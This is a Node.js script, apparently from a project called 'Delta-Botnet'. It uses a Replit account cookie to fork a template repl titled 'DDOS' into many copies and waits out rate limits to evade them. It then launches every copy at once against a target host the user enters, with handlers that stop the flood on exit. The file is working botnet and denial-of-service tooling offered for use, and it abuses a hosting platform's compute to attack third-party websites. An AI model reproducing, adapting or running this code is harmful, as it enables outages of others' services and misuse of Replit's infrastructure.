const Client = require("replapi-it");
const crypto = require("crypto");
const prompt = require("prompt");
const config = require("./config");
require("colors");

var nodos = [];
var started = 0;
var needOtherSleep = true;
var toMake = Number(config["repls"]);
var cookie = config["cookie"];

setTimeout(() => {
  console.log(
    `________           .__     __            __________           __                     __   
    \\______ \\    ____  |  |  _/  |_ _____    \\______   \\  ____  _/  |_   ____    ____  _/  |_ 
     |    |  \\ _/ __ \\ |  |  \\   __\\\\__  \\    |    |  _/ /  _ \\ \\   __\\ /    \\ _/ __ \\ \\   __\\
     |    \`   \\\\  ___/ |  |__ |  |   / __ \\_  |    |   \\(  <_> ) |  |  |   |  \\\\  ___/  |  |  
    /_______  / \\___  >|____/ |__|  (____  /  |______  / \\____/  |__|  |___|  / \\___  > |__|  
            \\/      \\/                   \\/          \\/                     \\/      \\/       `
      .brightRed
  );
  console.log(
    `[By iRennegade]
  [https://github.com/iRennegade/Delta-Botnet]
  [🌟 Star github project for a big update ]\n\n`.brightBlue
  );
  console.log(`Trying to connect to the account..`.bgYellow);
}, 2000);

const client = new Client(cookie);

const newRepl = async (template) => {
  var name = crypto.randomBytes(6).toString("hex");

  if (!template.console) await template.connect();

  const newrepl = await template.fork({
    title: "DELTA-" + name,
  });

  if (newrepl) {
    nodos.push(newrepl);
    console.log(`[ + ] - REPL CREATED: ${newrepl.title}`);
  } else {
    console.log(
      `[ + ] - Failed creating repl, sleeping 45 seconds to evade ratelimit`
    );
    needOtherSleep = true;
    await new Promise((resolve) => setTimeout(resolve, 30000));
    needOtherSleep = false;
  }
};

client.on("ready", async () => {
  const rls = await client.user.repls.fetch();
  const re = await rls.find((x) => x.title === "DDOS");

  console.log(`Successfully connected to ${client.user.username}`.bgGreen);
  console.log(`Searching Template REPL`.bgYellow);

  if (!re) {
    console.log("REPL wasn't found, creating it..".bgRed);

    const user = await client.users.fetch("weedblunt");
    const repls = await user.repls.fetch();
    const repl_template = repls.find((x) => x.title === "Delta-Botnet");

    const created_repl = await repl_template.fork({
      title: "DDOS",
      description: "Money machine",
    });
    await created_repl.connect();

    console.log(`Sucessfuly connected to ${created_repl.title}`.bgGreen);
    prompt.start();

    console.log(
      `Change the host of ${created_repl.title}/.replit\nSyntax: ./main host path\nExample: ./main https://google.com /`
    );

    prompt.get(["Did you finished?"], async () => {
      for (let i = 0; i < toMake; i++) {
        await newRepl(created_repl);
        await new Promise((resolve) => setTimeout(resolve, 3000));
      }

      console.log(`[${started}/${nodos.length}] Starting Attack`.bold.bgGreen);

      nodos.forEach(async (nodo) => {
        started++;
        await nodo.connect();

        nodo.console.run();
        console.log(
          `[${started}/${nodos.length}] ${nodo.title} Started attack`.bgCyan
        );
      });
      console.log("Press CTRL + C to stop attack.");
    });
  } else {
    await re.connect();
    console.log(`Sucessfuly connected to ${re.title}`.bgGreen);

    for (let i = 0; i < toMake; i++) {
      // Handle Rate-Limits
      if (needOtherSleep) {
        await new Promise((resolve) => setTimeout(resolve, 30000));
        await newRepl(re);
      }
      await newRepl(re);
    }

    console.log(`[${started}/${nodos.length}] Starting Attack`.bold.bgGreen);

    nodos.forEach(async (nodo) => {
      await nodo.connect();
      nodo.console.run();
      started++;
      console.log(
        `[${started}/${nodos.length}] ${nodo.title} Started attack`.bgCyan
      );
    });

    console.log("Press CTRL + C to stop attack.");
  }
});

process.on("SIGINT", () => {
  nodos.forEach(async (nodo) => {
    started--;
    await nodo.connect();
    await nodo.console.stop();
    console.log(
      `[${started}/${nodos.length}] ${nodo.title} Stopped attack`.bgCyan
    );
  });
  process.exit();
});

process.on("SIGQUIT", () => {
  nodos.forEach(async (nodo) => {
    started--;
    await nodo.connect();
    await nodo.console.stop();
    console.log(
      `[${started}/${nodos.length}] ${nodo.title} Stopped attack`.bgCyan
    );
  });
  process.exit();
});

client.on("error", () => {});
